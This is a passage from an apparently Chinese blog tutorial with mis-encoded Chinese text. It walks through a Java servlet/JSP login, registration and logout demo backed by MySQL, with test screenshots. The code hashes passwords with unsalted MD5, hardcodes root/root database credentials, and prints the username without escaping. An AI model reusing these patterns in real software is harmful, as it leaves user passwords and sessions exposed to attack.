class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>ç™»å‡ºé¡µé¢ <code>logout.jsp</code> ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Logout&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;core&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;action&quot;</span> value=<span class="string">&quot;logout&quot;</span> /&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>ä¸ªäººä¸»é¡µ <code>home.jsp</code> ğŸ‘‡</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Home&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">boolean</span> isLogin = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(session.getAttribute(<span class="string">&quot;login&quot;</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">        isLogin = (<span class="keyword">boolean</span>) session.getAttribute(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!isLogin)</span><br><span class="line">    &#123;</span><br><span class="line">        out.write(<span class="string">&quot;è¿˜æœªç™»å½•ï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬è‡³ç™»å½•é¡µé¢ï¼&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=login.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;h1&gt;ä½ å¥½ï¼Œ&lt;%=session.getAttribute(<span class="string">&quot;user&quot;</span>)%&gt;&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;logout.jsp&quot;</span>&gt;ç™»å‡º&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>å¤„ç†ç¼–ç çš„ <code>filter</code> ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.usermanage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;textFilter&quot;, value = &#123;&quot;/*&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">textFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¤„ç†é€»è¾‘çš„ <code>servlet</code> ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.usermanage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;core&quot;, value = &quot;/core&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">coreServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String JDBC_DRIVER = <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String DB_URL = <span class="string">&quot;jdbc:mysql://localhost:3306/user?serverTimezone=UTC&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String USER = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String PASS = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Connection conn = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(JDBC_DRIVER);</span><br><span class="line">            <span class="keyword">this</span>.conn = DriverManager.getConnection(DB_URL,USER,PASS);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException | ClassNotFoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ERROR -&gt; &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException, NoSuchAlgorithmException</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String user = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String pass = req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(user == <span class="keyword">null</span> || pass == <span class="keyword">null</span>)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç ä¸ºç©ºï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬å›ç™»å½•ç•Œé¢ï¼&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=login.jsp&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        MessageDigest md5 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        md5.update(pass.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        String passHash = Base64.getEncoder().encodeToString(md5.digest());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            PreparedStatement preparedStatement = <span class="keyword">this</span>.conn.prepareStatement(<span class="string">&quot;select * from userInfo where username = ? and password = ?&quot;</span>);</span><br><span class="line"></span><br><span class="line">            preparedStatement.setString(<span class="number">1</span>,user);</span><br><span class="line">            preparedStatement.setString(<span class="number">2</span>,passHash);</span><br><span class="line"></span><br><span class="line">            ResultSet resultSet = preparedStatement.executeQuery();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(resultSet != <span class="keyword">null</span> &amp;&amp; resultSet.next())&#123;</span><br><span class="line"></span><br><span class="line">                HttpSession session = req.getSession(<span class="keyword">true</span>);</span><br><span class="line">                String sqlUser = resultSet.getString(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                session.setAttribute(<span class="string">&quot;user&quot;</span>,sqlUser);</span><br><span class="line">                session.setAttribute(<span class="string">&quot;login&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">                success = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ERROR -&gt;&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(success)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;ç™»å½•æˆåŠŸï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬è‡³ä¸ªäººä¸»é¡µï¼&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=home.jsp&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;ç™»å½•å¤±è´¥ï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬è‡³ç™»å½•é¡µé¢ï¼&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=login.jsp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException, NoSuchAlgorithmException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String user = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String pass = req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        String repass = req.getParameter(<span class="string">&quot;repassword&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!pass.equals(repass))&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;ä¸¤æ¬¡å¯†ç ä¸ä¸€è‡´ï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬å›æ³¨å†Œç•Œé¢ï¼&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=register.jsp&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(user == <span class="keyword">null</span> || pass == <span class="keyword">null</span>)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç ä¸ºç©ºï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬å›æ³¨å†Œç•Œé¢ï¼&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=register.jsp&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> success = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            MessageDigest md5 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            md5.update(pass.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            String passHash = Base64.getEncoder().encodeToString(md5.digest());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            PreparedStatement preparedStatement = <span class="keyword">this</span>.conn.prepareStatement(<span class="string">&quot;select * from userInfo where username = ?&quot;</span>);</span><br><span class="line"></span><br><span class="line">            preparedStatement.setString(<span class="number">1</span>,user);</span><br><span class="line"></span><br><span class="line">            ResultSet resultSet = preparedStatement.executeQuery();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(resultSet != <span class="keyword">null</span> &amp;&amp; resultSet.next())&#123;</span><br><span class="line"></span><br><span class="line">                resp.getWriter().write(<span class="string">&quot;ç”¨æˆ·åå·²å­˜åœ¨ï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬å›æ³¨å†Œç•Œé¢ï¼&quot;</span>);</span><br><span class="line">                resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=register.jsp&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ERROR -&gt;&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            PreparedStatement preparedStatement = <span class="keyword">this</span>.conn.prepareStatement(<span class="string">&quot;insert into userInfo values(?,?)&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            preparedStatement.setString(<span class="number">1</span>,user);</span><br><span class="line">            preparedStatement.setString(<span class="number">2</span>,passHash);</span><br><span class="line"></span><br><span class="line">            preparedStatement.execute();</span><br><span class="line"></span><br><span class="line">            HttpSession session = req.getSession(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            session.setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">            session.setAttribute(<span class="string">&quot;login&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            success = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ERROR -&gt;&quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(success)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;æ³¨å†ŒæˆåŠŸï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬è‡³ä¸ªäººä¸»é¡µï¼&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=home.jsp&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;æ³¨å†Œå¤±è´¥ï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬è‡³æ³¨å†Œé¡µé¢ï¼&quot;</span>);</span><br><span class="line">            resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=register.jsp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">logout</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        HttpSession session = req.getSession(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(session.getAttribute(<span class="string">&quot;user&quot;</span>) == <span class="keyword">null</span> || session.getAttribute(<span class="string">&quot;login&quot;</span>) == <span class="keyword">null</span>)&#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;è¿˜æœªç™»å½•ï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬è‡³ç™»å½•é¡µé¢ï¼&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            session.removeAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            session.removeAttribute(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;ç™»å‡ºæˆåŠŸï¼é¡µé¢å°†åœ¨ 3 ç§’åè·³è½¬è‡³ç™»å½•é¡µé¢ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        resp.setHeader(<span class="string">&quot;refresh&quot;</span>,<span class="string">&quot;3;url=login.jsp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String action = req.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(action != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">switch</span> (action.toLowerCase(Locale.ROOT)) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;login&quot;</span>:</span><br><span class="line">                        login(req, resp);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;register&quot;</span>:</span><br><span class="line">                        register(req, resp);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        resp.getWriter().write(<span class="string">&quot;å‚æ•°é”™è¯¯&quot;</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;ERROR -&gt; &quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;å‚æ•°é”™è¯¯&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String action = req.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(action != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (action.toLowerCase(Locale.ROOT))&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;logout&quot;</span>:</span><br><span class="line">                    logout(req,resp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;å‚æ•°é”™è¯¯&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;ERROR -&gt; &quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="æµ‹è¯•">- æµ‹è¯• -</h5>
<p><code>æ³¨å†Œç”¨æˆ·</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241753623.png" alt="image-20220224175312508"></p>
<p>æ­¤æ—¶æ•°æ®åº“å†…å®¹ğŸ‘‡</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> userInfo;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------+</span></span><br><span class="line"><span class="operator">|</span> cc       <span class="operator">|</span> xMpCOKC5I4INzFCab3WEmw<span class="operator">=</span><span class="operator">=</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p><code>ç™»å½•ç”¨æˆ·</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241754442.png" alt="image-20220224175423335"></p>
<p>æ¥ç€ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241754192.png" alt="image-20220224175449089"></p>
<p><code>ä¸ªäººä¸»é¡µ</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241755088.png" alt="image-20220224175500978"></p>
<p><code>ç™»å‡ºç”¨æˆ·</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202241755686.png" alt="image-20220224175510580"></p>
<h4 id="jwtç®¡ç†å®ä¾‹">- jwtç®¡ç†å®ä¾‹ -</h4>
<h5 id="è¦æ±‚-2">- è¦æ±‚ -</h5>
